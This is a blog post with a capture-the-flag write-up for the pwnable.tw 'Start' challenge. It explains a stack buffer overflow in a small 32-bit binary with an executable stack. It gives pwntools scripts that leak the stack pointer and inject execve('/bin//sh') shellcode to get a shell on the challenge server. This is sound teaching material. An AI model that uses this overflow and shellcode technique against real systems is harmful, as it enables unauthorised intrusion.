<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
<!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Start - pwnable.tw | TourPran Blogs</title>
<meta name="generator" content="Jekyll v4.2.0">
<meta property="og:title" content="Start - pwnable.tw">
<meta name="author" content="tourpran">
<meta property="og:locale" content="en_US">
<meta name="description" content="This is my blog for Binary Exploitation and Reverse Engineering.">
<meta property="og:description" content="This is my blog for Binary Exploitation and Reverse Engineering.">
<link rel="canonical" href="http://tourpran.me/writeup/2020/04/29/pwnabletw1.html">
<meta property="og:url" content="http://tourpran.me/writeup/2020/04/29/pwnabletw1.html">
<meta property="og:site_name" content="TourPran Blogs">
<meta property="og:type" content="article">
<meta property="article:published_time" content="2020-04-29T00:00:00+05:30">
<meta name="twitter:card" content="summary">
<meta property="twitter:title" content="Start - pwnable.tw">
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"Start - pwnable.tw","url":"http://tourpran.me/writeup/2020/04/29/pwnabletw1.html","datePublished":"2020-04-29T00:00:00+05:30","dateModified":"2020-04-29T00:00:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"http://tourpran.me/writeup/2020/04/29/pwnabletw1.html"},"author":{"@type":"Person","name":"tourpran"},"description":"This is my blog for Binary Exploitation and Reverse Engineering.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="shortcut icon" href="">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/default.min.css">
  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
  <!-- and it's easy to individually load additional languages -->
  <script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/languages/go.min.js"></script>
  <link rel="stylesheet" href="/assets/css/main.css">
  <script src="/assets/js/main.js"></script><link type="application/atom+xml" rel="alternate" href="http://tourpran.me/feed.xml" title="TourPran Blogs">
</head>
<body>



















<header class="site-header " role="banner">

  <div class="wrapper">
    <div class="site-header-inner">
<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
  <img class="site-favicon" title="TourPran Blogs" src="" onerror="this.style.display='none'">
  TourPran Blogs
</a>
</span><nav class="site-nav">
          <input type="checkbox" id="nav-trigger" class="nav-trigger">
          <label for="nav-trigger">
            <span class="menu-icon">
              <svg viewbox="0 0 18 15" width="18px" height="15px">
                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
              </svg>
            </span>
          </label>

          <div class="trigger">
<a class="page-link" href="/">HOME</a><a class="page-link" href="/pwntrain.html">PWN TRAINING</a><a class="page-link" href="/categories.html">CATEGORIES</a><a class="page-link" href="/portfolio.html">PORTFOLIO</a>




</div>
        </nav>
</div>
  </div>
</header>

<script>
  (function() {
    var lastScrollY = getScrollPos().y;
    var documentElement = document.documentElement;

    function storeScrollData() {
      var y = getScrollPos().y;var scrollStatus = "";

      if (y <= 0) {
        scrollStatus = "top";
      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
        scrollStatus = "bottom";
      } else {
        var isScrollDown = (y - lastScrollY > 0) ? true : false;
        scrollStatus = isScrollDown ? "down" : "up";
      }

      lastScrollY = y;
      documentElement.setAttribute("data-scroll-status", scrollStatus);
    }

    window.addEventListener('scroll', function(e) {
      storeScrollData();
    });

    storeScrollData();
  })();
</script>










































<script>
  function hashLocate(hashValue) {
    hashValue = hashValue.replace(/^.*#h-/, '');
    var element = document.getElementById(hashValue);

    if (!element) {
      return;
    }

    var header = document.querySelector('header.site-header');
    var headerRect = header.getBoundingClientRect();
    var headerTop = Math.floor(headerRect.top);
    var headerHeight = Math.floor(headerRect.height);
    var scrollPos = getScrollPos();
    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);

    if (offsetY == scrollPos.y) {
      return;
    }

    if (headerTop == 0  && offsetY > scrollPos.y) {
      offsetY += headerHeight + 2;
    } else if (headerTop < 0  && offsetY < scrollPos.y) {
      offsetY -= headerHeight - 2;
    }

    smoothScrollTo(offsetY);
  }

  // The first event occurred
  window.addEventListener('load', function(event) {
    if (window.location.hash) {
      hashLocate(window.location.hash);
    }
  });

  // The first event occurred
  window.addEventListener('click', function(event) {
    if (event.target.matches('a')) {
      hashLocate(event.target.getAttribute('href'));
    }
  });
</script>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="framework">
  <section class="main">

     <div class="post">
  <section>









<header class="post-header">
  <h1 class="post-title p-name" itemprop="name headline">Start - pwnable.tw</h1>
  <h3 class="post-subtitle"></h3>

  <p class="post-meta">
    <time class="dt-published" datetime="2020-04-29T00:00:00+05:30" itemprop="datePublished"><i class="fa fa-calendar"></i> 29 Apr 2020
    </time>

    





















    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 4 mins</span>
  </p>
<div class="post-tags"><a class="post-tag" href="/tags.html#pwnable.tw">#pwnable.tw</a></div></header>
<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

    <div class="post-content e-content" itemprop="articleBody">

      <p><img src="/assets/images/pwnabletw1/pwnable1.png" alt=""></p>

<h4 id="aim">AIM:</h4>
<p>Hey guys, Here our main objective is to get a shell and then to get the flag !!
I have tried my best to explain the challenge. Hope you like it !!</p>

<h3 id="solution">Solution:</h3>

<p>First I check the mitigations :</p>

<p><img src="/assets/images/pwnabletw1/pwnable2.png" alt=""></p>

<p>So I think it’s going to be fun !! As we have the permission to execute the stack (NX disabled). There is also no PIE so we don’t have to worry about the address changing every time :)
Now, let us run the binary and see what is happening :&gt;</p>

<p><img src="/assets/images/pwnabletw1/pwnable3.png" alt=""></p>

<p>So it’s simple just asking input and printing something. Now its time to see the assembly behind this binary.</p>

<p><img src="/assets/images/pwnabletw1/pwnable4.png" alt=""></p>

<p>So we can observe that all the registers are being emptied and then 5 values are beings pushed to the stack.
If we examine them we can see that they are the strings that are printed when we run the binary.
Math → 5 pushes are made and 4 bytes are taken for each push so a total of 20 bytes is taken by the binary to store it :P.
Also <code class="language-plaintext highlighter-rouge">INT 0x80</code> is equivalent to syscall. We can observe 2 syscalls being called</p>

<p><img src="/assets/images/pwnabletw1/pwnable5.png" alt=""></p>

<p>The first syscall is used to make the write. (For printing the string)</p>

<p><img src="/assets/images/pwnabletw1/pwnable6.png" alt=""></p>

<p>The second syscall is used to call read ( Probably to take our input ). Now let’s see what we can do to get root access !!</p>

<p>I hope you find the offset by yourself or try pattern create in gdb-peda. :)</p>

<h4 id="idea">Idea:</h4>

<ul>
  <li>We have to overflow to the return address and then we have to somehow leak the stack pointer (ESP)</li>
  <li>So if we get the stack pointers address then we can place the shellcode there and then point the EIP to that address to give us a shell!</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">Remember the write syscall prints the buffer pointed by the ECX.</code></p>

<ul>
  <li>After the syscall, the stack is cleared as they call the add instruction (It removes the 20 bytes)</li>
</ul>

<h4 id="crafting-the-exploit">Crafting the Exploit:</h4>

<ul>
  <li>first 20 bytes to fill the buffer then put the address of move ESP to ECX.</li>
  <li>So first input will give the ESP.</li>
  <li>Next, we place the shellcode (from shellstorm.org) then execute it.</li>
  <li>We don’t have to worry about the shift of the stack because there is no PIE</li>
</ul>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chall.pwnable.tw'</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
<span class="n">buf</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">20</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<span class="n">esp</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">esp</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>

<p>note: u32 is the opposite of p32 this returns the number and then we convert the number to hex. Also, we read the first 4 bytes the server sends us.</p>

<p>Output: <code class="language-plaintext highlighter-rouge">0xff819750</code></p>

<h4 id="final-exploitation">Final Exploitation</h4>

<ul>
  <li>We place the shellcode then just execute it, in the read that followed the write.</li>
</ul>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chall.pwnable.tw'</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
<span class="n">buf</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">20</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<span class="n">esp</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="s">'</span>
<span class="c1">#new exploit
</span><span class="n">buf</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mi">20</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">esp</span><span class="o">+</span><span class="mi">20</span><span class="p">)</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">shellcode</span>
<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>

<p><img src="/assets/images/pwnabletw1/pwnable7.png" alt=""></p>

<p>I hope you liked the write-up. More writeups on its way.</p>


    </div>

</article>
<div class="post-nav">
<a class="previous" href="/writeup/2020/03/20/zhero-ctf.html" title="c4n4ry Writeup | zh3r0 CTF">c4n4ry Writeup | zh3r0 CTF</a><a class="next" href="/writeup/2020/04/30/pwnabletw2.html" title="ORW - pwnable.tw">ORW - pwnable.tw</a>
</div>
<div class="post-related">
      <div>Related Articles</div>
      <ul>
        <li><a class="post-link" href="/writeup/2020/04/30/pwnabletw2.html" title="ORW - pwnable.tw">ORW - pwnable.tw</a></li>
<li><a class="post-link" href="/blogs/2021/03/27/sqlinjection.html" title="ORW - pwnable.tw">SQL Injection</a></li>
<li><a class="post-link" href="/writeup/2021/12/30/inctfjquals.html" title="ORW - pwnable.tw">Leaky pipes - InCTFj Quals</a></li>
<li><a class="post-link" href="/pwn-training/2022/01/20/checkpointpwn.html" title="ORW - pwnable.tw">Checkpoint</a></li>
</ul>
    </div>
<div class="post-comments">
<div id="disqus_thread"></div>
<script>
  var disqus_config = function () {
    this.page.url = 'http://tourpran.me/writeup/2020/04/29/pwnabletw1.html';
    this.page.identifier = 'http://tourpran.me/writeup/2020/04/29/pwnabletw1.html';
  };
  (function() {
    var d = document, s = d.createElement('script');
    s.src = 'https://tourpran.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
  })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
</noscript>
</div></section>
</div>


  </section>
  <section class="sidebar" style="margin-left: 15px;">
    <!-- Get sidebar items --><style type="text/css" media="screen">
.post-menu ul {
  list-style: none;
  padding: 0;
  margin: 0;
}
</style>

<div class="post-menu">
  <div class="post-menu-title">TOC</div>
  <div class="post-menu-content"></div>
</div>

<script>
  function generateContent() {
    var menu = document.querySelector(".post-menu");
    var menuContent =  menu.querySelector(".post-menu-content");
    var headings = document.querySelector(".post-content").querySelectorAll("h2, h3, h4, h5, h6");

    // Hide menu when no headings
    if (headings.length === 0) {
      return menu.style.display = "none";
    }

    // Generate post menu
    var menuHTML = '';
    for (var i = 0; i < headings.length; i++) {
      var h = headings[i];
      menuHTML += (
        '<li class="h-' + h.tagName.toLowerCase() + '">'
        + '<a href="#h-' + h.getAttribute('id') + '">' + h.textContent + '</a></li>');
    }

    menuContent.innerHTML = '<ul>' + menuHTML + '</ul>';

    // The header element
    var header = document.querySelector('header.site-header');

    function doMenuCollapse(index, over_items=20) {
      var items = menuContent.firstChild.children;

      if (items.length < over_items) {
        return;
      }

      var activeItem = items[index];
      var beginItem = activeItem
      var endItem = activeItem
      var beginIndex = index;
      var endIndex = index + 1;
      while (beginIndex >= 0
        && !items[beginIndex].classList.contains('h-h2')) {
        beginIndex -= 1;
      }
      while (endIndex < items.length
        && !items[endIndex].classList.contains('h-h2')) {
        endIndex += 1;
      }
      for (var i = 0; i < beginIndex; i++) {
        item = items[i]
        if (!item.classList.contains('h-h2')) {
          item.style.display = 'none';
        }
      }
      for (var i = beginIndex + 1; i < endIndex; i++) {
        item = items[i]
        // if (!item.classList.contains('h-h2')) {
          item.style.display = '';
        // }
      }
      for (var i = endIndex; i < items.length; i++) {
        item = items[i]
        if (!item.classList.contains('h-h2')) {
          item.style.display = 'none';
        }
      }
    }

    // Init menu collapsed
    doMenuCollapse(-1);

    // Active the menu item
    window.addEventListener('scroll', function (event) {
      var lastActive = menuContent.querySelector('.active');
      var changed = true;
      var activeIndex = -1;
      for (var i = headings.length - 1; i >= 0; i--) {
        var h = headings[i];
        var headingRect = h.getBoundingClientRect();
        var headerRect = header.getBoundingClientRect();
        var headerTop = Math.floor(headerRect.top);
        var headerHeight = Math.floor(headerRect.height);
        var headerHeight = headerTop + headerHeight + 20;
        if (headingRect.top <= headerHeight) {
          var id = 'h-' + h.getAttribute('id');
          var a = menuContent.querySelector('a[href="#' + id  + '"]');
          var curActive = a.parentNode;
          if (curActive) {
            curActive.classList.add('active');
            activeIndex = i;
          }
          if (lastActive == curActive) {
            changed = false;
          }
          break;
        }
      }
      if (changed) {
        if (lastActive) {
          lastActive.classList.remove('active');
        }
        doMenuCollapse(activeIndex);
      }
      event.preventDefault();
    });
  }
  generateContent();
</script>
</section>
</div>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

</footer>
</body>
</html>
